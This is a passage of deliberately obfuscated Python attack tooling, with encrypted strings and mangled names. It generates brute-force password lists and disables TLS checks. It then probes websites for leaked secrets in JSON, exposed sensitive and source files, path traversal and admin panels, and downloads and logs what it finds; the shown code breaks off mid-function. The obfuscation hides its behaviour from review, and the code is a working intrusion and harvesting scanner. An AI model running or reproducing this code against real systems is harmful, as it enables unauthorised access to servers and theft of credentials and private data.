        passwords.append(_0lOO1OOl01OO.upper())
        passwords.append(_0lOO1OOl01OO.lower())
        for _0ll1ll1l00Il010I in [_1Ol10I0O0O(b'-', b'\xb2\xa2\xf9\xb0'), _OIlO10OIO1O1(b'\xa1', b'\xf2^\x19\xe0'), _l1OIOIOIIOIIl01I(b'x', b'Y{\xa5/'), _l1OIOIOIIOIIl01I(b':\x97\x07', b'\xf6\xbe\x94 '), _l1OIOIOIIOIIl01I(b'\x1f\xc8\x9a\xb6', b'.Pk\x07'), _1Ol10I0O0O(b'\xfb\xcd\xd88', b'\x9c\x0b}\xa5'), _OIlO10OIO1O1(b'H\xdce\xb8', b'-b@\xe7'), _OIlO10OIO1O1(b'\xae\x1b\x02\xd9\xb4\x84', b'\x93"J-')]:
            passwords.append(_0lOO1OOl01OO + _0ll1ll1l00Il010I)
            passwords.append(_0lOO1OOl01OO.capitalize() + _0ll1ll1l00Il010I)
            passwords.append(_0lOO1OOl01OO + _OIlO10OIO1O1(b'%', b'\x08\x19\x9c\xeb') + _0ll1ll1l00Il010I)
            passwords.append(_0lOO1OOl01OO + _OIlO10OIO1O1(b'\xf1', b't<\xa9\xfb') + _0ll1ll1l00Il010I)
            passwords.append(_0lOO1OOl01OO + _1Ol10I0O0O(b'\xd6', b'\x87 \x88u') + _0ll1ll1l00Il010I)
            passwords.append(_0lOO1OOl01OO + _l1OIOIOIIOIIl01I(b"'", b'\xa0K)%') + _0ll1ll1l00Il010I)
            passwords.append(_0lOO1OOl01OO + _1Ol10I0O0O(b'j', b']\x0f=\x9e') + _0ll1ll1l00Il010I)
        for _0OIl0lIOOI in [_l1OIOIOIIOIIl01I(b'\xb0', b'4\xbe\xfd\xfc'), _l1OIOIOIIOIIl01I(b'\xdd', b']B\xedF'), _OIlO10OIO1O1(b'T', b'\x82\x0bd\xcd'), _l1OIOIOIIOIIl01I(b'Y', b'\x9fT\xe5\xb0'), _1Ol10I0O0O(b'\xf7', b'L\x01\xd1\x89'), _l1OIOIOIIOIIl01I(b'\xb9', b'\xb0H(\xf8'), _OIlO10OIO1O1(b'\x1a', b'\x93\xad(\x93'), _l1OIOIOIIOIIl01I(b'\x8a', b'T\xaa\x8a\xc2')]:
            passwords.append(_0lOO1OOl01OO + _0OIl0lIOOI)
            passwords.append(_0lOO1OOl01OO.capitalize() + _0OIl0lIOOI)
            passwords.append(_0OIl0lIOOI + _0lOO1OOl01OO)
            passwords.append(_0OIl0lIOOI + _0lOO1OOl01OO + _OIlO10OIO1O1(b':\xa6\xf4', b'\x86.\x1d\xd4'))
            passwords.append(_0lOO1OOl01OO + _0OIl0lIOOI + _1Ol10I0O0O(b'd4\x92', b'\xf3\xba\xab\x9c'))
    _I0OIOlOI0011 = _OIlO10OIO1O1(b'8\xf36~:\xb9\xe3\xd5\x91#\x93\xcdp\xc2\x15\xa9\t\x0b\x13\xd1\xda\xb4c\x85\x92\x18\xff\x15\x9eCU\xce\xd9\x85\xa1v\x99\xee7\xc3\x0f\x8aU\xd4\xf3\xfa\x19z5\xfe\x16\x0f\xac\x92\xefMF\x13\x87\x00K\x82\xc1\xc58WV\xc7\x0e\x92', b'\x98k\xe2\xfc')
    for _ in range(132375521 ^ 132375245):
        _IlOII0l101 = _l1OIIl0IIlOO1O1Il.randint(328167338 ^ 328167340, 2107476912 ^ 2107476922)
        pwd = _1Ol10I0O0O(b'', b'HW\xb2?').join((_l1OIIl0IIlOO1O1Il.choice(_I0OIOlOI0011) for _ in range(_IlOII0l101)))
        passwords.append(pwd)
    return list(set(passwords))[:1407519707 ^ 1407520263]
_l1OOlOI01I01 = _llO1I1O01I1O0()
_II10IOl1I1O = _0IOl0lIOOOl()
_100III00lOI = []
_1llIOl1I0IOI0 = _0Oll10OOlIlI(int)
_l100lO1lOI = _0OlO1O0lI1I0IOI.Lock()
_Ol1I1I111O1lII1 = requests.Session()
_Ol1I1I111O1lII1.headers.update({_OIlO10OIO1O1(b'bd\xa5\xea\xbe\x11A\xef\xaf\x14', b'\xb6f[V'): _IIlIl1llO0lII1})
_Ol1I1I111O1lII1.verify = False
_0OI100OO0001OI0 = False
_llIl0l00I001llOl = []
_I0O0O01OO1OI1O0O = []
_0llOlI10lIII1 = []
_0OlOllOIIIlO1l0 = {_OIlO10OIO1O1(b'@\xe0\xb7\x83tI\xa1', b'\x8cC"?'): 1772459005 ^ 1772459005, _OIlO10OIO1O1(b'\x8f\x82h79', b"'4\x06$"): 1015793391 ^ 1015793391, _l1OIOIOIIOIIl01I(b'\xa9$\xc7\xb4\xad', b'\xfc\xef\xd2\xa7'): 748685259 ^ 748685259}

def _l0I0Ol0IIOOIlO0l1O():
    _0Il1llO1lIO0l.system(_OIlO10OIO1O1(b'=\xa2-', b'\xdc\xbdq\xf6') if _0Il1llO1lIO0l.name == _OIlO10OIO1O1(b'D\xce', b'\xb1f\xc7\xc1') else _l1OIOIOIIOIIl01I(b' H+Rv', b'\xd5 \x9f<'))

def _0OOI0I0lOlI():
    for d in [_IlOO01I01lI11l0, _10lIlOOl0llO]:
        if not _0Il1llO1lIO0l.path.exists(d):
            _0Il1llO1lIO0l.makedirs(d)

def _lOO000IOl101II0():
    return _I1ll00O0lll1IO1.now().strftime(_OIlO10OIO1O1(b'w\x07S\x8e\xa0t\xe4\xbc', b'\xa9\xeb\x0cT'))

def _II00Oll11I1IOO():
    return _I1ll00O0lll1IO1.now().strftime(_l1OIOIOIIOIIl01I(b'\xb4\xb6;\x1cW \x0c\xdd\xd1\xc8\xf18R\xd4\xa5W\x0e', b'\xa0\xe8\t\xd1'))

def _OlOOO0IIOl00O0(msg, level=_OIlO10OIO1O1(b"\xeb'\xdab", b'\xccKo4')):
    timestamp = _lOO000IOl101II0()
    _0lI0O1l1OOlO1I = {_OIlO10OIO1O1(b'\x1d\n\xb3K\xd0', b'\xf3\x00%\x17'): _lOO0O0101IOl00001.GREEN + _11lIl00I1IO1I.BRIGHT, _1Ol10I0O0O(b'p\xcbF\x1c$\x17\xf3k', b'\xeb$\x8c\x98'): _lOO0O0101IOl00001.RED + _11lIl00I1IO1I.BRIGHT, _1Ol10I0O0O(b'\xdam\xf8>q', b'\xfdi\xad\x9f'): _lOO0O0101IOl00001.RED, _1Ol10I0O0O(b'\xd0\x12`\xc1U)\xdb', b'b\x17\x8b!'): _lOO0O0101IOl00001.YELLOW, _l1OIOIOIIOIIl01I(b'\xd8%q\xe0#\xf8\xf3', b'Sd\xe2i'): _lOO0O0101IOl00001.GREEN, _l1OIOIOIIOIIl01I(b'0\x85C{', b'V3\x95\xb0'): _lOO0O0101IOl00001.CYAN, _OIlO10OIO1O1(b'#\xb69\x07\x8f', b'q\xa3_\xab'): _lOO0O0101IOl00001.MAGENTA, _l1OIOIOIIOIIl01I(b'wr%\xa7DM', b'Z\xe3\x99\x1a'): _lOO0O0101IOl00001.BLUE + _11lIl00I1IO1I.BRIGHT, _OIlO10OIO1O1(b'\x1f"X\xac\nh\xc9\xdb', b'^CH\x1f'): _lOO0O0101IOl00001.LIGHTCYAN + _11lIl00I1IO1I.BRIGHT, _1Ol10I0O0O(b'\xe9\xef\x89\xf2f', b'5\x97*\xa6'): _lOO0O0101IOl00001.LIGHTMAGENTA + _11lIl00I1IO1I.BRIGHT, _OIlO10OIO1O1(b'\xe2\xde7\xbc', b'\xf0\x1c\x1b:'): _lOO0O0101IOl00001.LIGHTYELLOW, _1Ol10I0O0O(b'\x8d\x175p', b'\xf7IRV'): _lOO0O0101IOl00001.RED + _11lIl00I1IO1I.BRIGHT, _l1OIOIOIIOIIl01I(b'3<\xfcz\xaa\x06$iT\x9a\xbe\x00\xfa', b'+\x15\xf2*'): _lOO0O0101IOl00001.GREEN + _11lIl00I1IO1I.BRIGHT + _1IO011l10lOlll1.MAGENTA}
    color = _0lI0O1l1OOlO1I.get(level, _lOO0O0101IOl00001.WHITE)
    full = f'[{timestamp}] {color}{msg}{_11lIl00I1IO1I.RESET_ALL}'
    print(full)
    with _l100lO1lOI:
        with open(_lOO110110Il, _OIlO10OIO1O1(b'j', b'\xc3\xae\xfd\xdc'), encoding=_l1OIOIOIIOIIl01I(b'\xd0\x9b\xad\xfb\xc4', b'0O\x0e2'), errors=_l1OIOIOIIOIIl01I(b'\xbc\n\x96\x8f=B', b'Zc\x84\x0f')) as _O1OIOO1l1l0lll11:
            _O1OIOO1l1l0lll11.write(f'[{timestamp}] {msg}\n')

def _IOOlI1l101Ill1Il():
    with _l100lO1lOI:
        with open(_1IOI01l11l1O, _1Ol10I0O0O(b'\xd6', b'\xb2\xde7-'), encoding=_OIlO10OIO1O1(b'\x8b\x96\x8a&\xfd', b'k0\x18\xfe')) as _llOOIOl11OO0:
            json.dump({_l1OIOIOIIOIIl01I(b'X\n\xd6\x93=\t\x8du\xf3', b'[\xf8H\x07'): _II00Oll11I1IOO(), _1Ol10I0O0O(b'\xa0\xc1\x8c/M\x9c,\xf0', b"b'\xf9\xdd"): _0l00OI0llII, _1Ol10I0O0O(b'2\x86\x92\xb4(\x1c\xef', b';\xdaO\xf7'): _lI000O10IOO1l, _l1OIOIOIIOIIl01I(b"'\x0f\xff\x15R\xe8\x05\x9e\xaf", b'b\x928\xe5'): _lI0lOO0l010l1, _1Ol10I0O0O(b'/\xb3\xf7\x7ft\xc8\xc2\xa8K\x18w', b'\xed\xaa\x17\x90'): len(_100III00lOI), _1Ol10I0O0O(b'\xdct7&\x8f~\x98', b'\xaa\x81d\x98'): _100III00lOI, _1Ol10I0O0O(b'\x04\x17xhe', b'\x97k\xfeI'): dict(_1llIOl1I0IOI0), _OIlO10OIO1O1(b'q"s\xa6\xf0\x0f\xd5>v\xab\x17\x18W\x9cZI', b'$CL\xd2'): _llIl0l00I001llOl, _OIlO10OIO1O1(b'\xe0@Ye|F\x91\xa2\xb7\x8f\xfc\xcd', b'\xe9\x96\xff\xa1'): _I0O0O01OO1OI1O0O, _OIlO10OIO1O1(b'\xcbI\x804\x8e\xb3\x0e\x8b:DJ', b"\x95'\xa3\x90"): _0llOlI10lIII1}, _llOOIOl11OO0, indent=895633988 ^ 895633990)
    _OlOOO0IIOl00O0(f'Data saved to {_1IOI01l11l1O}', _OIlO10OIO1O1(b'\xe0\xaer_3e7', b'\xc3\xb9\x99\x8d'))

def _Il1l0lIIl00l():
    global _100III00lOI, _llIl0l00I001llOl, _I0O0O01OO1OI1O0O, _0llOlI10lIII1
    if _0Il1llO1lIO0l.path.exists(_1IOI01l11l1O):
        try:
            with open(_1IOI01l11l1O, _OIlO10OIO1O1(b"'", b'p\x96A\xdb')) as _OO10Ol10OO:
                data = json.load(_OO10Ol10OO)
                _100III00lOI = data.get(_1Ol10I0O0O(b'/*\xddl\xd0\x9cr', b'\xde\xe6\x90\x08'), [])
                _llIl0l00I001llOl = data.get(_1Ol10I0O0O(b'\xfa\xe2\xd9\xee\xd0\xbd\x19~\xb4\xa1\xf5o\x85a\xff\xcb', b'KJO\x91'), [])
                _I0O0O01OO1OI1O0O = data.get(_l1OIOIOIIOIIl01I(b'\n\x9e\x84\x91Nm\xb8\xb5 \xf3\xe6\x01', b'*\xa1\xca\xec'), [])
                _0llOlI10lIII1 = data.get(_1Ol10I0O0O(b'\xe8<9w\xf6\xaf\xaf\xc7\xea\xcc7', b'\xb0\x99\xef\xbe'), [])
                return data
        except:
            pass
    return None

def _IlOOlI10I0(url, content, file_type=_1Ol10I0O0O(b'\xfb\x96 |\x1b\x16', b'\xc8\xe3\xfe\x90')):
    try:
        filename = url.split(_OIlO10OIO1O1(b'>', b'\x0b\xb5$\xd9'))[-(238337550 ^ 238337551)] or _OIlO10OIO1O1(b'\x020/\xaa\xfe\x00FwR\xad', b'\xb1c`\xfc')
        if not filename or _1Ol10I0O0O(b'\xc4', b'\x91\xdc\xf9\xb5') not in filename:
            filename = f'{_0l10I0OOI0.md5(url.encode()).hexdigest()[:10]}.txt'
        filename = _O1O0IOll0O00l.sub(_OIlO10OIO1O1(b'\xe4\xff\r\xb3\xd6\x0ey\xc1\xf2', b'\xc1\xb8t\xb2'), _OIlO10OIO1O1(b'1', b'\xfa\xe2\xbb\xbe'), filename)
        _1l0Il0Il101 = _I1ll00O0lll1IO1.now().strftime(_OIlO10OIO1O1(b'\xc9\xcb\x08\x83\xf4\xbe', b'-Z1\xb3'))
        _01lII0OlllI = _0Il1llO1lIO0l.path.join(_10lIlOOl0llO, _1l0Il0Il101)
        if not _0Il1llO1lIO0l.path.exists(_01lII0OlllI):
            _0Il1llO1lIO0l.makedirs(_01lII0OlllI)
        _1IIOO1Il1OO1 = _0Il1llO1lIO0l.path.join(_01lII0OlllI, filename)
        if _0Il1llO1lIO0l.path.exists(_1IIOO1Il1OO1):
            _0I000l1IOI0IOIOOI, _OIII011llOlO00 = _0Il1llO1lIO0l.path.splitext(filename)
            _1IIOO1Il1OO1 = _0Il1llO1lIO0l.path.join(_01lII0OlllI, f'{_0I000l1IOI0IOIOOI}_{int(time.time())}{_OIII011llOlO00}')
        with open(_1IIOO1Il1OO1, _OIlO10OIO1O1(b'\xc7', b'\xba\xcd{1'), encoding=_l1OIOIOIIOIIl01I(b'\x87\xa2d\xd0\xd6', b'\x17\x9e\xe2\xc7'), errors=_l1OIOIOIIOIIl01I(b'7\x95S)z\x8b', b'\x91w(e')) as _001III101110O0:
            _001III101110O0.write(f'URL: {url}\n')
            _001III101110O0.write(f'Type: {file_type}\n')
            _001III101110O0.write(f'Fetched: {_II00Oll11I1IOO()}\n')
            _001III101110O0.write(_1Ol10I0O0O(b'T', b'T^xr') * (595148182 ^ 595148202) + _OIlO10OIO1O1(b'\xe0\x96', b'\xe6c<\x18'))
            _001III101110O0.write(content)
        _OlOOO0IIOl00O0(f'SOURCE SAVED: {_1IIOO1Il1OO1}', _1Ol10I0O0O(b'\x9ds\xe5^\x03\xf6\xd4\xac', b'\x19\xf5\xd3g'))
        return _1IIOO1Il1OO1
    except Exception as e:
        _OlOOO0IIOl00O0(f'Error saving source: {e}', _OIlO10OIO1O1(b'#\x86\x99=\x89', b'\x8fs\x1fK'))
        return None

def _101lIIOl11I00O0l(url):
    try:
        r = _Ol1I1I111O1lII1.get(url, timeout=_lOO1I1IOO1OII1l1, verify=False)
        if r.status_code == 255708576 ^ 255708520:
            content = r.text
            _10lOl1Ol1l0OI1 = _IlOOlI10I0(url, content)
            _OlOOO0IIOl00O0(f'SOURCE GRABBED: {url} -> {_10lOl1Ol1l0OI1}', _l1OIOIOIIOIIl01I(b'a\xae\x90(\x14t', b'\x93.\xc5-'))
            return content
        else:
            _OlOOO0IIOl00O0(f'Failed to fetch: {url} - Status {r.status_code}', _OIlO10OIO1O1(b'\r\x1f>\xa1K', b'a;\x8b\xfc'))
            return None
    except Exception as e:
        _OlOOO0IIOl00O0(f'Error: {url} - {str(e)[:80]}', _l1OIOIOIIOIIl01I(b':\x8a\x16\x9f\x89', b'\x161\xcf\xc7'))
        return None

def _O0III0IIl0(url, filename=None):
    try:
        if not filename:
            filename = url.split(_1Ol10I0O0O(b']', b'\x80\t\x84\xc4'))[-(1929491484 ^ 1929491485)] or _1Ol10I0O0O(b'we\x93L\x931\xed\xbe\xb7\x95', b'\xa4\x9d\xe6\xa7')
            if not filename or _OIlO10OIO1O1(b'\xea', b'\xb1J\xcew') not in filename:
                filename = f'file_{_0l10I0OOI0.md5(url.encode()).hexdigest()[:8]}.html'
        filename = _O1O0IOll0O00l.sub(_OIlO10OIO1O1(b'W\x02\xcc\xee\x08!\xfe\x02\x05', b'\x18\xb1\xee\x04'), _1Ol10I0O0O(b'h', b'\xd8\x91\x82\xbe'), filename)
        _110llO1I0O11 = _I1ll00O0lll1IO1.now().strftime(_1Ol10I0O0O(b'\xd7\xfe%\xb5\x86\xe9', b'G\xc0\xfd\xf3'))
        _11l1l0IO00 = _0Il1llO1lIO0l.path.join(_10lIlOOl0llO, _110llO1I0O11)
        if not _0Il1llO1lIO0l.path.exists(_11l1l0IO00):
            _0Il1llO1lIO0l.makedirs(_11l1l0IO00)
        _10l0I1I1O1I1O1O1I0 = _0Il1llO1lIO0l.path.join(_11l1l0IO00, filename)
        if _0Il1llO1lIO0l.path.exists(_10l0I1I1O1I1O1O1I0):
            _IIIO0OOOlO0I100l, _ll0lIIIl000II010 = _0Il1llO1lIO0l.path.splitext(filename)
            _10l0I1I1O1I1O1O1I0 = _0Il1llO1lIO0l.path.join(_11l1l0IO00, f'{_IIIO0OOOlO0I100l}_{int(time.time())}{_ll0lIIIl000II010}')
        r = _Ol1I1I111O1lII1.get(url, timeout=_lOO1I1IOO1OII1l1, verify=False)
        if r.status_code == 1011652890 ^ 1011653074:
            with open(_10l0I1I1O1I1O1O1I0, _1Ol10I0O0O(b'\x8e\xe6', b'z\xc3\x02\xc7')) as _1100l1l0I0O110IO:
                _1100l1l0I0O110IO.write(r.content)
            _II1l0I01IIO0II = {_1Ol10I0O0O(b'\x0c\x03B', b'r\x01\xad\x0b'): url, _1Ol10I0O0O(b'\xad\xb45\xdeI\x0eN\xf5', b'= \x84\xe8'): _0Il1llO1lIO0l.path.basename(_10l0I1I1O1I1O1O1I0), _1Ol10I0O0O(b'\xb9\xa0\xf8/', b'P\xed\xca\x9d'): _10l0I1I1O1I1O1O1I0, _l1OIOIOIIOIIl01I(b'\xa4\xa7\xe8\xb6', b'\x9ei\x8a`'): len(r.content), _OIlO10OIO1O1(b'\xe1:\x18[', b'"-5n'): r.headers.get(_l1OIOIOIIOIIl01I(b'\x04=\xe8\x12A\xcf\x16\xf5\xbb\xc3o\xad', b'i\xb0\xbc\xeb'), _l1OIOIOIIOIIl01I(b'e\x8f\xec\x91S0\x03', b'\xd7\xe6NU')), _l1OIOIOIIOIIl01I(b'\xa6\xcc\x8b\x1b\xf5\xcc{t\x04', b'\xab\xd8\x1b\xa2'): _II00Oll11I1IOO(), _1Ol10I0O0O(b'\xeb!r', b'\xd5\xf4\xa4\xec'): _0l10I0OOI0.md5(r.content).hexdigest()}
            with _l100lO1lOI:
                _llIl0l00I001llOl.append(_II1l0I01IIO0II)
            _OlOOO0IIOl00O0(f'DOWNLOADED: {_0Il1llO1lIO0l.path.basename(_10l0I1I1O1I1O1O1I0)} ({len(r.content)} bytes)', _1Ol10I0O0O(b'\xe65\x99^K&\xb73', b'rl\xe2 '))
            _IOOlI1l101Ill1Il()
            return _II1l0I01IIO0II
        else:
            _OlOOO0IIOl00O0(f'Download failed: {filename} - Status {r.status_code}', _l1OIOIOIIOIIl01I(b' \xc3\x15\xba"', b'\xb3\x0e\xf7M'))
            return None
    except Exception as e:
        _OlOOO0IIOl00O0(f'Error downloading: {e}', _OIlO10OIO1O1(b"\x01!\x92'\x10", b'\x8fwI\n'))
        return None

def _1OIIO1IIOlOIO(base_url, path):
    try:
        target = _llll110l10OI0(base_url, path)
        _lO101lIOI0OO = _OO0O1I1Ol11OI0l1I(target)
        if not _lO101lIOI0OO.netloc:
            return None
        r = _Ol1I1I111O1lII1.get(target, timeout=_lOO1I1IOO1OII1l1, allow_redirects=False, verify=False)
        status = r.status_code
        size = len(r.content)
        content_type = r.headers.get(_OIlO10OIO1O1(b'\xab&-\x9bB\x11 -z\x01\xa5t', b'\xfch\xea\xbe'), _l1OIOIOIIOIIl01I(b'', b'Q\x88e\x14')).lower()
        _OIII0OOIII01O0 = False
        vuln_type = _1Ol10I0O0O(b'', b'\xdbT\xede')
        severity = _l1OIOIOIIOIIl01I(b' !$', b'\xe2\xa5\x8d\x91')
        if _1Ol10I0O0O(b'\xa8\xddh\xf9', b'ex\xc5\xd3') in content_type or path.endswith(_1Ol10I0O0O(b'q\xec\xa5t\x83', b'\x14\xca\xcb\xb4')):
            try:
                _1lO1llO10lOI0Il1l = r.json()
                _I0011OIlI0OOI110 = json.dumps(_1lO1llO10lOI0Il1l, indent=2140051286 ^ 2140051284)
                sensitive = [_1Ol10I0O0O(b'e\x8b\xa6\x11\x9af\xf0\xcf', b'D\x8cWa'), _l1OIOIOIIOIIl01I(b'V\xfeKV\xaf\xa3S', b'\xc9w\xc9d'), _OIlO10OIO1O1(b'\x1c\xd7\xf2\x01\xde', b'\x8di\x16N'), _OIlO10OIO1O1(b'7Y\xadJE3', b'"\xfc%\x08'), _OIlO10OIO1O1(b'\x92G\xc7\xe8', b'\x97\x9b\xb6\xc7'), _1Ol10I0O0O(b'w\x1c\x8ao#', b'\xe2~?\x00'), _1Ol10I0O0O(b'\x84\xf9\xf7\xf5\x11', b'\x80\x91\x8b\xcb'), _l1OIOIOIIOIIl01I(b'6l\x98\xf0', b'\xc2.\xf4&'), _1Ol10I0O0O(b'\xb0YE', b'\xc0)&#'), _OIlO10OIO1O1(b'\xc1P\xdd%', b'`\n\x15\xe7'), _1Ol10I0O0O(b'\nW\xa3', b'\n\xd2\xb12'), _OIlO10OIO1O1(b'\xc0Q;\x97l34\xe6\xa5#d', b'l6s\xf6'), _OIlO10OIO1O1(b'\xa2[u\xb3D\x9e\xf0\xdc', b'm0\xa6\xd4'), _1Ol10I0O0O(b'\x13\xa2', b'e%\xfb\x9b'), _1Ol10I0O0O(b'fcoB', b'\xde\xc9u\x99'), _l1OIOIOIIOIIl01I(b'\x91\x11X\x0f', b'\nr=>'), _1Ol10I0O0O(b'w{V7q\xdf\x87?', b'\xc1\x94\xea\xce'), _l1OIOIOIIOIIl01I(b'\x1c\x050\x96\xee', b'B\xf8\xa8`'), _1Ol10I0O0O(b'\x8f\x91\x0b2h\xe7', b'\xf5E\xf1\x01'), _OIlO10OIO1O1(b'\x86\x17\xbd', b'\xbc\xfc\xb7\xdd'), _1Ol10I0O0O(b'K\xa2|\xe4Z(F', b'\xa8\x9b\x91/')]
                found = [k for k in sensitive if k in _I0011OIlI0OOI110.lower()]
                if found:
                    _OIII0OOIII01O0 = True
                    vuln_type = _l1OIOIOIIOIIl01I(b"\x99\x8c\xdar\x02\x98\xdf'\x86", b'\xebsT1')
                    severity = _1Ol10I0O0O(b'\xe3\x17\xb7\xc9\xc7\xee\xcd\x9c', b'#\xbe\xabz')
                    _IlOOlI10I0(target, _I0011OIlI0OOI110, _l1OIOIOIIOIIl01I(b'\x88|\x14\xf9-m\xaf`\xcc', b'\xc5\x1d\x8f\xe3'))
                    _OlOOO0IIOl00O0(f'[Noes] JSON LEAK FOUND: {target}', _OIlO10OIO1O1(b'\xfco\xd5\x9b', b'\xa7\xaa\xf8\x93'))
            except:
                if size > 203097291 ^ 203097291 and _OIlO10OIO1O1(b'l', b'\xfd(f\xd5') in r.text:
                    _OIII0OOIII01O0 = True
                    vuln_type = _l1OIOIOIIOIIl01I(b'\x04\x93D\xefq?\xab\xcf3\xb97\x10', b' \x92\xe6\xd4')
                    severity = _l1OIOIOIIOIIl01I(b'\xfa\xd0\x82\x0b', b'\xe3\xe25s')
                    _IlOOlI10I0(target, r.text[:1964935017 ^ 1964938465], _OIlO10OIO1O1(b'\xd2\x02\xf6\xbe$\xf7\xc8]u\xde"\xc1', b'<MC\x18'))
        _0I1OI1II1O1OO0O = [_1Ol10I0O0O(b'U\x88U\xa4', b'\x9b\xa8\x05O'), _1Ol10I0O0O(b'/\xee\x88:', b'$\x1di\xcc'), _1Ol10I0O0O(b'\x12}\xa1\x11', b'R\x97\x1bz'), _l1OIOIOIIOIIl01I(b'\xcb\xcd9\xd2', b'\xf3\x145\x83'), _1Ol10I0O0O(b'~\x15D?\xa7\xec\xf3v\x92', b'\xe6\x9a\xe5N'), _l1OIOIOIIOIIl01I(b'\xe3O\xd9\xcd\xe9\xd5"\xf8\xfb', b'\x07\xa2\xc0\x1c'), _OIlO10OIO1O1(b'\x1aU\xbbW', b'\x18\xa5\x00\xc6'), _1Ol10I0O0O(b'C\xc4\xdd\x0b', b'\xf0A\xb7\x9a'), _l1OIOIOIIOIIl01I(b'}6\xa5\xb3', b'&\xfc\xdca'), _1Ol10I0O0O(b"X'P\xfa", b'5\xa5\x01\x1e'), _l1OIOIOIIOIIl01I(b'\xc9\xa0}?p', b'jtJF'), _l1OIOIOIIOIIl01I(b'\x19h\x86P', b'\xca\xd8<\x90'), _1Ol10I0O0O(b':\xb2\x1a\xaf', b'\xf3\xae>I'), _1Ol10I0O0O(b'\xfdr\x1b\xae', b'\xe6r\x99{'), _l1OIOIOIIOIIl01I(b'Q\xd5a\xed', b'X\xf3p\x0e'), _1Ol10I0O0O(b'\x0f\xab\xbf\xa8', b'\xec\xe6\xb5^'), _1Ol10I0O0O(b',\xab\xa0\xf3*\xf6\x18*-', b'\x83\xc1\xe0\xeb'), _l1OIOIOIIOIIl01I(b'"\xef\x14l\xf1', b'\xfe\x1c\x02\x1a')]
        if any((path.endswith(e) for e in _0I1OI1II1O1OO0O)):
            if status == 1294817158 ^ 1294817102 and size > 979269100 ^ 979269100:
                _OIII0OOIII01O0 = True
                vuln_type = _1Ol10I0O0O(b'\xa5+\xef\x19\x89\x81HAi\xa2L0w4', b'\x80\x1b\xb09')
                severity = _OIlO10OIO1O1(b'A\xbbz?', b'\xaa\xf5\xa2\xc2')
                _IlOOlI10I0(target, r.text[:230335570 ^ 230338538], _OIlO10OIO1O1(b'\x84x\xf9B\x0b\xb7f([', b'\xae*a\x00'))
                _OlOOO0IIOl00O0(f'[Noes] SENSITIVE FILE: {target}', _l1OIOIOIIOIIl01I(b'\x0eP\xf7\x1a', b'P<0\xf4'))
        _1110000Il0OOl000 = [_l1OIOIOIIOIIl01I(b'3[\xc1\xc8', b'\xf5\xec\xe8y'), _1Ol10I0O0O(b'\xb6\xe3\xd5\x8d\xde', b'\t\xe1\x977'), _l1OIOIOIIOIIl01I(b'\xf3\xd4S"', b'ju\xd3s'), _OIlO10OIO1O1(b'\xbb\x8b\xd9', b'`\xf2e\x92'), _l1OIOIOIIOIIl01I(b'\x15\n(', b'\xa3\xad\x18>'), _OIlO10OIO1O1(b'Y\xa3d\x01', b'\xfdn\xdb#'), _OIlO10OIO1O1(b'\xbf\xa5\xd2\x88}', b'\xe1\xdc\xe3\xa4'), _OIlO10OIO1O1(b'\x08\xaa\x82\xad', b'\xa0\xe0\x1fV'), _OIlO10OIO1O1(b'\x03x[', b'\x94\x00\x95]'), _l1OIOIOIIOIIl01I(b'\xd0 ?v', b'\xa9\xac\xbe\x1c'), _1Ol10I0O0O(b'\xcf+\xd6K', b'e\xb8\x9e\xbb'), _1Ol10I0O0O(b'\xa0o\x04\xe1', b'D\t\x9f\x05'), _l1OIOIOIIOIIl01I(b'^\xef\x98', b'\xa0\x04[\xcc'), _1Ol10I0O0O(b'x\x11\xcc', b'\xe5o\xf4\x7f'), _OIlO10OIO1O1(b'\xedb\xa0', b'\xdb\x9b\x87\x91'), _1Ol10I0O0O(b'\xc3\x8dI', b'\x19\xd6\xf5\xef'), _l1OIOIOIIOIIl01I(b's=\xfb[}', b'\x18!W\xe1'), _l1OIOIOIIOIIl01I(b'\xac\xd0@\xf5', b"\xd7{'\xd0"), _l1OIOIOIIOIIl01I(b'\x94G\xefB', b'\xa4\xd6o%'), _OIlO10OIO1O1(b'\xe8I]R', b']\xe4\x8fj'), _OIlO10OIO1O1(b'\xb0\x98\x8e\xf2', b'\xa5\xbc\xca\xb7')]
        if any((path.endswith(e) for e in _1110000Il0OOl000)):
            if status == 1282518568 ^ 1282518752 and size > 390142958 ^ 390142958:
                _OIII0OOIII01O0 = True
                vuln_type = _1Ol10I0O0O(b'\x0b\xad\xae\xcf(\xd9yJ\xe2Z\xad', b'\xa1\xf4^0')
                severity = _l1OIOIOIIOIIl01I(b']\x9d\xeb\x02i\xf8', b'r\xe0\x84\xb0')
                _IlOOlI10I0(target, r.text[:580631145 ^ 580628945], _1Ol10I0O0O(b'\xc26\x06X\x18\x81\xbb\xc3Y\xf5\x0f', b'\xc6)\x14\xc4'))
                _OlOOO0IIOl00O0(f'[Noes] SOURCE CODE: {target}', _OIlO10OIO1O1(b'=`\x91B', b'AB\xc8^'))
        if _l1OIOIOIIOIIl01I(b'#+\x85', b'\xfdxBb') in path or _1Ol10I0O0O(b'I\xa8/', b'\x96\xd7\xed\xb9') in path:
            if status == 4121660 ^ 4121844 and size > 30037194 ^ 30037194:
                _OIII0OOIII01O0 = True
                vuln_type = _OIlO10OIO1O1(b'\x8ad\x03DK\xa5\x1f\x8b\x186H\xbe\xa0\x8d\xd9#\xa6\xaa\xca', b'\x07LXT')
                severity = _1Ol10I0O0O(b'\xac*\xe7\x00m\xb6g\x13', b'`n\xe3>')
                _IlOOlI10I0(target, r.text[:281310546 ^ 281309826], _l1OIOIOIIOIIl01I(b'\x8c\xef[\xc3\xa5)c\x9d!', b'\xe4\x9be\x82'))
                _OlOOO0IIOl00O0(f'[Noes] TRAVERSAL: {target}', _1Ol10I0O0O(b'i\x86k\xb1', b'\x1b\x00\xc7\xfe'))
        _O01IIl1OI10 = [_l1OIOIOIIOIIl01I(b'\xa0\x85\xf8Z\x17\x1a', b'\xee&x\xd5'), _l1OIOIOIIOIIl01I(b'\x9c\xfc:\x87\xfe\x97\xb2\xc0\xf2\xa7', b'\xe3^14'), _1Ol10I0O0O(b'd\xf4\xc5', b'>\x1aa\x94'), _l1OIOIOIIOIIl01I(b'\xce\xf3\xf8i\xa2\x84m', b'f\xf6\xcfB'), _OIlO10OIO1O1(b'\xc5\x84\xe8\x03|\xe9g|]', b'\xf8\xceE\x86'), _l1OIOIOIIOIIl01I(b'D\xa7C\xa4l\x7f\xe2\xba]\xf1\xa8\x1c\x85\xfd', b'Z\x93Tr'), _OIlO10OIO1O1(b'\x87\xb3=\xc8\x0c\xd8\xdd\xf0\xac\x82\xe8', b',\xe9\xbf\xcc'), _1Ol10I0O0O(b'\x08IJ\xac\xfe\x91y\xed\xefe<HW', b'\x97Fd\\')]
        if any((admin in path for admin in _O01IIl1OI10)):
